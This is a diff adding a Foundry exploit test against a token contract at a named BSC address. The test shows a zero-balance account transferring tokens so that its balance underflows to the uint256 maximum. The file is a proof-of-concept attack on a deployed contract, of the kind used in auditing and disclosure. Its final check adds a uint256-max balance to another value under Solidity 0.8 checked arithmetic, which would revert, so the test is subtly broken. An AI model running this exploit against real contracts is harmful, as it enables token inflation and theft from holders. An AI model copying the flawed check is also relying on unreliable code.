@@ -1,0 +1,71 @@
+```solidity
+// Exploit.t.sol
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable StandardToken
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function owner() external view returns (address);
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+}
+
+contract ExploitTest is Test {
+    // Deployed vulnerable token address on BSC
+    address constant TOKEN = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
+    IERC20 token;
+
+    function setUp() public {
+        token = IERC20(TOKEN);
+        // Label known addresses for readability
+        vm.label(TOKEN, "VulnerableToken");
+    }
+
+    /// @notice Demonstrates the "Transfer amount exceeds balance" vulnerability.
+    /// An account with zero balance can successfully transfer tokens, causing an
+    /// underflow in the sender's balance mapping. This inflates the sender's balance
+    /// to near uint256 max and increases the total sum of balances beyond totalSupply.
+    function testTransferExceedsBalance() public {
+        // Use a fresh address with zero token balance
+        address attacker = address(0xDEAD);
+        address receiver = address(0xBEEF);
+
+        uint256 attackerBalanceBefore = token.balanceOf(attacker);
+        uint256 receiverBalanceBefore = token.balanceOf(receiver);
+        assertEq(attackerBalanceBefore, 0, "Attacker should start with 0 balance");
+        assertEq(receiverBalanceBefore, 0, "Receiver should start with 0 balance");
+
+        // The attacker attempts to transfer 1 token despite having zero tokens.
+        // In a correct implementation this would revert.
+        // The vulnerable contract allows the call to succeed because the subtraction
+        // underflows (0 - 1 = 2^256-1) due to missing or insufficient balance checks.
+        vm.prank(attacker);
+        bool success = token.transfer(receiver, 1);
+        assertTrue(success, "Transfer should succeed even though sender has insufficient balance");
+
+        uint256 attackerBalanceAfter = token.balanceOf(attacker);
+        uint256 receiverBalanceAfter = token.balanceOf(receiver);
+
+        // Sender's balance underflows to near max uint256
+        assertEq(attackerBalanceAfter, type(uint256).max, "Sender balance should underflow to max");
+
+        // Receiver receives the 1 token as expected
+        assertEq(receiverBalanceAfter, 1, "Receiver should have 1 token");
+
+        // The sum of all balances now exceeds the original total supply (which is fixed)
+        // This confirms the integrity violation.
+        uint256 totalSupply = token.totalSupply();
+        uint256 sumBalances = attackerBalanceAfter + receiverBalanceAfter;
+        assertTrue(sumBalances > totalSupply, "Sum of balances should exceed total supply after exploit");
+    }
+}
+```
